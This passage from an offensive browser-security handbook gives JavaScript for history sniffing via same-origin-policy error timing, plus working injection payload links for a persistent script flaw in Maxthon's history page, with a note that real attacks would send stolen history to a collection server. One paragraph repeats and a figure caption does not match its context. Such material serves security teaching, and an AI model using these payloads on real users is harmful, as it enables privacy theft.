
```
function wait_for_noread() {
  try {
    /*
     * This is where the SOP violation is happening, 
     * because we're trying to read the location.href 
     * property of a cross-origin resource loaded into
     * an IFrame.
    */
    if (frames['f'].location.href == undefined) throw 1;
  
    /*
     * Until TIME_LIMIT is not reached, continuously try to
     * read location.href from the IFrame. Otherwise call
     * maybe_test_next() that resets the IFrame src to 
     * about:blank preventing the full resource loading 
     * and cache alteration.
     * Then proceed with the next resource.
    */
    if (cycles++ >= TIME_LIMIT) {
      maybe_test_next();
      return;

    }
    setTimeout(wait_for_noread, 1);
  } catch (e) {
    /*
     * The SOP violation is trapped, confirming
     * that the checked resource is cached.
     */
    confirmed_visited = true;
    maybe_test_next();
  }
}
```

When an SOP violation is trapped before a specific time-out, it means the cache is being hit. This confirms that the resource is cached, and from this you can infer the user has visited the website where the resource was loaded from. [Figure 4-23](#c04.html#figure4-23) demonstrates this behavior.

 start figure 

[**Figure 4-23:**](#c04.html#figureanchor4-23) SOP violation errors

![c04f023.tif](image_fi/662090c04/c04f023.png)

 end figure 

You can read the full source code of this technique on the [https://browserhacker.com](https://browserhacker.com) website, or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) where the original three PoCs have been modified and merged as a single code snippet.

When an SOP violation is trapped before a specific time-out, it means the cache is being hit. This confirms that the resource is cached, and from this you can infer the user has visited the website where the resource was loaded from. [Figure 4-23](#c04.html#figure4-23) demonstrates this behavior.

 start figure 

[**Figure 4-24:**](#c04.html#figureanchor4-24) Calling the proprietary AFRunCommand function

![c04f024.tif](image_fi/662090c04/c04f024.png)

 end figure 

A similar vulnerability has been found in Maxthon 3.4.5 build 2000. Maxthon is another web browser and, similar to Avant, Maxthon exposes non-standard APIs to access files and even launch executables.

Roberto Suggi Liverani found47 that the content rendered in the about:history page does not have effective output escaping. This leads to exploitable conditions. If you trick a target into opening a link like the following, malicious injection will persist in the history page:

```
http://172.16.37.1/malicious.html#" onload='alert(1)'<!—
```

The code contained in the onload attribute will execute every time the target checks the browser history. The interesting thing here is that the malicious JavaScript code is executed in a privileged context. The about:history page happens to be mapped to a custom Maxthon resource at mx://res/history/index.htm. Injecting code into this context allows you to steal all the history content. For example, the following code parses all the links in the history-list div:

```
links = document.getElementById('history-list')
.getElementsByTagName('a');
result = "";
for(var i=0; i<links.length; i++) {
  if(links[i].target == "_blank"){
       result += links[i].href+"\n";
  }
}
alert(result);
```

This payload could be packaged and delivered with the following link:

```
http://172.16.37.1/malicious.html#" onload='links=document.
getElementById("history-list").getElementsByTagName("a"); 
result="";for(i=0;i<links.length;i++){if(links[i].target=="_blank"
{result+=links[i].href+"\n";}}alert(result);'<!--
```

It is important to note that this Cross-content Scripting (explored further in Chapter 7) vulnerability is persistent. After loading the malicious content into the history page the first time, the code will execute every time the user revisits their history. When the user opens the browser history page, the result will be something similar to [Figure 4-25](#c04.html#figure4-25).

 start figure 

[**Figure 4-25:**](#c04.html#figureanchor4-25) The malicious code injected as a link is executed.

![c04f025.tif](image_fi/662090c04/c04f025.png)

 end figure 

Naturally, to launch a real attack it would be necessary to replace the alert() function with one of the hooking techniques discussed in Chapter 3. This way, the stolen browser history can be sent back to a collection server.
